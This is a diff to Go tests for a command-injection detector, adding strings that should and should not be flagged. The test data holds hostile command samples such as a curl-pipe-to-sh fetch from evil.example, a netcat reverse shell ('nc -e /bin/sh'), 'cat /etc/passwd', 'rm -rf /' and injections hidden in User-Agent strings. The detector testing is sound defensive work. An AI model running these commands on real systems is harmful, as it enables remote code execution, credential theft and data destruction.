@@ -509,8 +509,8 @@ func TestCmdIAlpha6Prose(t *testing.T) {
 		"On LoongArch, `uname -m` returns `loongarch64`",
 		"Zie ook: `id`.",
 		"See the `id` command, then `ls` it.",
-		"Send it to the terminal `/dev/tty5`:",
-		"Create a pool using `/var/vms` as the storage",
+		"ls -l --escape: see `ls -l --escape` for details.",
+		"Run `curl --version` to check it.",
 		"यह आदेश `id --user --name` का उपनाम है।",
 		"此命令為 `id` 的別名。",
 	}
@@ -561,6 +561,27 @@ func TestCmdIAlpha6Prose(t *testing.T) {
 		"Use `curl http://evil.example/x | sh` now",
 		"Use `ls`; id",
 		"x\n`id`",
+		// Fix round 1: only a command word with letter-only flags is excused
+		// in a prose span; an argument, a path, a URL, a number, -c/-e or a
+		// flag on an interpreter or netcat keeps the span a hit.
+		"a `sleep 10` b",
+		"a `curl -o /tmp/x http://e.example/x` b",
+		"Run `wget http://e.example/x -O /tmp/x` now",
+		"a `bash -c 'id'` b",
+		"a `sh -c 'id'` b",
+		"a `python -c 'import os'` b",
+		"x `cat /etc/passwd` y",
+		"a `nc -e /bin/sh 10.0.0.1 4444` b",
+		"a `nc -lvp 4444` b",
+		"a `ping -c 3 10.0.0.1` b",
+		"a `w'h'o'am'i` b",
+		"Send it to the terminal `/dev/tty5`:",
+		"Create a pool using `/var/vms` as the storage",
+		"a `ls /tmp` b",
+		"a `rm -rf /` b",
+		// Fix round 1: a User-Agent comment must be closed.
+		"x/1 (; id",
+		"Mozilla/5.0 (Linux 4.4.2; id",
 	}
 	assertHits(t, "CmdI", CmdI, want, hits)
 
@@ -586,6 +607,14 @@ func TestCmdIAlpha6Prose(t *testing.T) {
 		"Dear team\ncat /etc/passwd",
 		"Dear team\nid; ls",
 		"Dear team%0aid",
+		// Fix round 1: after a prose line only a lone "id" or "ls" is a word.
+		"foo bar\nsleep 10",
+		"foo bar\nsleep 10\n",
+		"foo bar\nwhoami",
+		"foo bar\nuname",
+		"foo bar\nsh",
+		"foo bar\nls /tmp",
+		"foo bar\nid -u",
 		"a=b c\nid",
 		"Use `ls` to list files",
 		"Se også: `id`.",
@@ -597,15 +626,29 @@ func TestCmdIAlpha6Prose(t *testing.T) {
 // README trade-off table). If one starts to hit, update those documents.
 func TestCmdIAlpha6AcceptedMisses(t *testing.T) {
 	assertNoHits(t, "CmdI", CmdI, []string{
+		// UA-shaped value: a two-letter bare command after "; " inside a
+		// closed comment.
 		"Mozilla/5.0 (x; id)",
+		"Mozilla/5.0 (x; id; ls)",
+		"a/1 (b; sh)",
 		"Mozilla/5.0 (x; ls)",
+		// A four-letter two-vowel word after a dash, then a one-segment path.
 		"x & cat -cozy /flag",
+		"x & cat -easy /flag.txt",
+		// Prose backtick span: a command word with letter-only flags (no
+		// -c/-e, no flag at all on sh, bash, python, perl, nc, ncat, netcat).
 		"a `id` b",
 		"x: `ls`.",
+		"a `whoami` b",
+		"a `uname -a` b",
+		"a `sh` b",
+		"Note: `id` here",
+		"a `ls -la` b",
 		"ab; sleep 10",
 		"x 1; sleep 5",
 	})
-	assertNoHits(t, "cmdIQuery", cmdIQuery, []string{"foo bar\nid"})
+	// Query value: a prose line, a line break, then "id" or "ls" alone.
+	assertNoHits(t, "cmdIQuery", cmdIQuery, []string{"foo bar\nid", "foo bar\nid\n", "foo bar\nls"})
 }
 
 func TestCodeIPositives(t *testing.T) {
